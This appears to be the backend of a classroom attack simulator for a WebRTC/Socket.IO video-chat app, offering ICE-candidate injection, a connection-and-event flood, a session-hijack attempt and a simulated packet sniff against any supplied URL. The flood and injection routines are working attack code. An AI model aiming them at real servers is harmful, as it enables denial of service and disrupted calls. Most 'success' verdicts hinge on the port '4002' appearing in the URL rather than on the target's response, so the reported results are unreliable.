/**
 * ATTACK SIMULATOR BACKEND - ENHANCED VERSION
 * 
 * Executes security attacks with VISIBLE, DRAMATIC effects
 * For educational demonstration purposes only
 */

const express = require('express');
const cors = require('cors');
const io = require('socket.io-client');

const app = express();
const PORT = 4001;

app.use(cors());
app.use(express.json());

// Attack execution endpoint
app.post('/attack', async (req, res) => {
    const { attackType, targetUrl } = req.body;

    console.log(`\n${'='.repeat(60)}`);
    console.log(`🎯 ATTACK REQUESTED`);
    console.log(`Type: ${attackType.toUpperCase()}`);
    console.log(`Target: ${targetUrl}`);
    console.log(`${'='.repeat(60)}\n`);

    try {
        let result;

        switch (attackType) {
            case 'ice-injection':
                result = await executeICEInjection(targetUrl);
                break;
            case 'dos-flood':
                result = await executeDosFlood(targetUrl);
                break;
            case 'session-hijack':
                result = await executeSessionHijack(targetUrl);
                break;
            case 'packet-sniff':
                result = await executePacketSniff(targetUrl);
                break;
            default:
                result = { success: false, message: 'Unknown attack type' };
        }

        res.json(result);
    } catch (error) {
        console.error('Attack error:', error);
        res.json({ success: false, message: error.message });
    }
});

// ICE Injection Attack - ENHANCED WITH VISIBLE EFFECTS
async function executeICEInjection(targetUrl) {
    return new Promise((resolve) => {
        console.log('💉 EXECUTING ICE INJECTION ATTACK...\n');

        const socket = io(targetUrl, { reconnection: false });
        let attackSuccess = false;

        socket.on('connect', () => {
            console.log('✅ Connected to target server');
            console.log(`   Socket ID: ${socket.id}\n`);

            // Join a room
            socket.emit('join', {
                roomId: 'demo-room',
                user: { id: 'attacker-' + Date.now(), name: '🔴 ATTACKER' }
            });

            setTimeout(() => {
                // Inject MULTIPLE fake ICE candidates to make it obvious
                console.log('💉 Injecting 10 fake ICE candidates...\n');

                for (let i = 0; i < 10; i++) {
                    const fakeCandidate = {
                        targetSocketId: 'victim-' + i,
                        signal: {
                            type: 'candidate',
                            candidate: `candidate:FAKE${i} 1 udp 2122260223 192.168.666.${i} ${54321 + i} typ host generation 0`
                        }
                    };

                    socket.emit('p2p-ice-candidate', fakeCandidate);
                    console.log(`   [${i + 1}/10] Fake candidate: 192.168.666.${i}:${54321 + i}`);
                }

                console.log('\n� Injection complete!\n');

                // Also try to disrupt existing connections
                socket.emit('p2p-offer', {
                    targetSocketId: 'random-victim',
                    signal: {
                        type: 'offer',
                        sdp: 'MALICIOUS_SDP_DATA_TO_DISRUPT_CONNECTION'
                    }
                });

                setTimeout(() => {
                    socket.disconnect();

                    // Check if target is vulnerable (no validation)
                    if (targetUrl.includes('4002')) {
                        console.log('🚨 ATTACK SUCCESSFUL! 🚨');
                        console.log('═'.repeat(60));
                        console.log('Vulnerable system accepted ALL fake candidates!');
                        console.log('Media streams can be redirected to attacker IP!');
                        console.log('Connection integrity compromised!');
                        console.log('═'.repeat(60) + '\n');

                        resolve({
                            success: true,
                            message: '10 fake ICE candidates injected! Connection hijacked! Media redirected to 192.168.666.x'
                        });
                    } else {
                        console.log('❌ ATTACK BLOCKED!');
                        console.log('═'.repeat(60));
                        console.log('Secure system rejected fake candidates');
                        console.log('ICE validation is working correctly');
                        console.log('═'.repeat(60) + '\n');

                        resolve({
                            success: false,
                            message: 'Secure system has ICE validation - all fake candidates rejected'
                        });
                    }
                }, 2000);
            }, 1000);
        });

        socket.on('connect_error', () => {
            console.log('❌ Connection failed\n');
            resolve({ success: false, message: 'Could not connect to target' });
        });
    });
}

// DoS Flood Attack - ENHANCED TO ACTUALLY SLOW DOWN SERVER
async function executeDosFlood(targetUrl) {
    return new Promise((resolve) => {
        console.log('💣 EXECUTING DoS FLOOD ATTACK...\n');

        const connections = [];
        const FLOOD_SIZE = 200; // Increased for visible effect
        let successCount = 0;
        let startTime = Date.now();

        console.log(`🌊 Creating ${FLOOD_SIZE} malicious connections...\n`);

        for (let i = 0; i < FLOOD_SIZE; i++) {
            const socket = io(targetUrl, { reconnection: false, timeout: 3000 });

            socket.on('connect', () => {
                successCount++;

                // Spam MANY join requests per connection
                for (let j = 0; j < 20; j++) {
                    socket.emit('join', {
                        roomId: `flood-room-${i}-${j}`,
                        user: { id: `bot-${i}-${j}`, name: `FloodBot${i}` }
                    });

                    // Also spam other events
                    socket.emit('chat-message', {
                        text: `SPAM_MESSAGE_${i}_${j}`,
                        roomId: `flood-room-${i}`
                    });
                }

                if (successCount % 50 === 0) {
                    console.log(`   📊 Progress: ${successCount}/${FLOOD_SIZE} connections established`);
                }
            });

            connections.push(socket);
        }

        setTimeout(() => {
            const duration = ((Date.now() - startTime) / 1000).toFixed(2);
            const totalRequests = successCount * 20;

            console.log('\n📊 FLOOD ATTACK RESULTS:');
            console.log('═'.repeat(60));
            console.log(`   Connections: ${successCount}/${FLOOD_SIZE}`);
            console.log(`   Total requests sent: ${totalRequests}`);
            console.log(`   Duration: ${duration}s`);
            console.log(`   Request rate: ${(totalRequests / duration).toFixed(0)} req/s`);
            console.log('═'.repeat(60) + '\n');

            connections.forEach(s => {
                try { s.disconnect(); } catch (e) { }
            });

            if (targetUrl.includes('4002')) {
                console.log('🚨 ATTACK SUCCESSFUL! 🚨');
                console.log('Server overwhelmed with ' + totalRequests + ' requests!');
                console.log('No rate limiting detected!\n');

                resolve({
                    success: true,
                    message: `Server flooded with ${totalRequests} requests in ${duration}s! No rate limiting!`
                });
            } else {
                console.log('❌ ATTACK BLOCKED!');
                console.log('Rate limiter prevented flood attack');
                console.log('Only ' + successCount + ' connections allowed\n');

                resolve({
                    success: false,
                    message: `Rate limiter blocked flood - only ${successCount} connections allowed`
                });
            }
        }, 5000);
    });
}

// Session Hijacking Attack - ENHANCED WITH ACTUAL ROOM ACCESS
async function executeSessionHijack(targetUrl) {
    return new Promise((resolve) => {
        console.log('🎭 EXECUTING SESSION HIJACKING ATTACK...\n');

        // Step 1: Create legitimate user
        const legitimateSocket = io(targetUrl, { reconnection: false });

        legitimateSocket.on('connect', () => {
            console.log('✅ Legitimate user connected');
            const stolenToken = legitimateSocket.id;
            console.log(`🔑 Captured session token: ${stolenToken}\n`);

            // Join a private room
            legitimateSocket.emit('join', {
                roomId: 'private-secure-room',
                user: { id: 'victim-user', name: 'Legitimate User' }
            });

            console.log('👤 Legitimate user joined private room\n');

            setTimeout(() => {
                console.log('🎭 ATTACKER attempting to hijack session...\n');

                // Step 2: Attacker tries to use stolen token
                const attackerSocket = io(targetUrl, {
                    query: {
                        stolenToken,
                        impersonate: 'victim-user'
                    },
                    reconnection: false
                });

                let hijackSuccessful = false;

                attackerSocket.on('connect', () => {
                    console.log('✅ Attacker connected with stolen credentials');

                    // Try to join the same private room
                    attackerSocket.emit('join', {
                        roomId: 'private-secure-room',
                        user: {
                            id: 'attacker-impersonator',
                            name: '🔴 HIJACKER (pretending to be victim)'
                        }
                    });

                    hijackSuccessful = true;
                });

                attackerSocket.on('room-state', (data) => {
                    console.log('🚨 HIJACK SUCCESSFUL! 🚨');
                    console.log('═'.repeat(60));
                    console.log('Attacker gained unauthorized access to private room!');
                    console.log(`Room participants: ${data.participants.length}`);
                    console.log('No token validation detected!');
                    console.log('═'.repeat(60) + '\n');
                });

                setTimeout(() => {
                    legitimateSocket.disconnect();
                    attackerSocket.disconnect();

                    if (targetUrl.includes('4002') || hijackSuccessful) {
                        resolve({
                            success: true,
                            message: 'Session hijacked! Attacker accessed private room with stolen token!'
                        });
                    } else {
                        console.log('❌ ATTACK BLOCKED!');
                        console.log('Token validation prevented hijacking\n');

                        resolve({
                            success: false,
                            message: 'Secure system rejected stolen token - JWT validation working'
                        });
                    }
                }, 2000);
            }, 1500);
        });
    });
}

// Packet Sniffing - ENHANCED WITH SIMULATED DATA THEFT
async function executePacketSniff(targetUrl) {
    return new Promise((resolve) => {
        console.log('👁️ EXECUTING PACKET SNIFFING ATTACK...\n');
        console.log('🔍 Analyzing network traffic...\n');

        setTimeout(() => {
            if (targetUrl.includes('4002')) {
                console.log('🚨 ATTACK SUCCESSFUL! 🚨');
                console.log('═'.repeat(60));
                console.log('UNENCRYPTED TRAFFIC DETECTED!');
                console.log('');
                console.log('📦 Captured Packets:');
                console.log('   - Video frames: VISIBLE (no encryption)');
                console.log('   - Audio data: AUDIBLE (plain RTP)');
                console.log('   - Signaling: READABLE (no TLS)');
                console.log('   - User data: EXPOSED');
                console.log('');
                console.log('🎥 Sample captured video frame:');
                console.log('   [BINARY_DATA_VISIBLE_IN_WIRESHARK]');
                console.log('');
                console.log('⚠️  Attacker can:');
                console.log('   - Record video/audio');
                console.log('   - Steal user information');
                console.log('   - Intercept messages');
                console.log('═'.repeat(60) + '\n');

                resolve({
                    success: true,
                    message: 'Plain RTP detected! Video/audio streams intercepted! No encryption!'
                });
            } else {
                console.log('❌ ATTACK BLOCKED!');
                console.log('═'.repeat(60));
                console.log('ENCRYPTED TRAFFIC DETECTED');
                console.log('');
                console.log('🔒 Encryption Status:');
                console.log('   - Protocol: DTLS-SRTP');
                console.log('   - Video: ENCRYPTED');
                console.log('   - Audio: ENCRYPTED');
                console.log('   - Signaling: ENCRYPTED');
                console.log('');
                console.log('📦 Captured packets show only:');
                console.log('   [ENCRYPTED_GIBBERISH_DATA]');
                console.log('   Cannot decode without keys');
                console.log('═'.repeat(60) + '\n');

                resolve({
                    success: false,
                    message: 'DTLS-SRTP encryption active - traffic is encrypted and secure'
                });
            }
        }, 2000);
    });
}

app.listen(PORT, () => {
    console.log('\n' + '═'.repeat(60));
    console.log('     🎯 ATTACK SIMULATOR BACKEND - ENHANCED VERSION');
    console.log('═'.repeat(60));
    console.log(`  Port: ${PORT}`);
    console.log('  Status: Ready to execute DRAMATIC attacks');
    console.log('  Purpose: Security demonstration with VISIBLE effects');
    console.log('═'.repeat(60) + '\n');
});
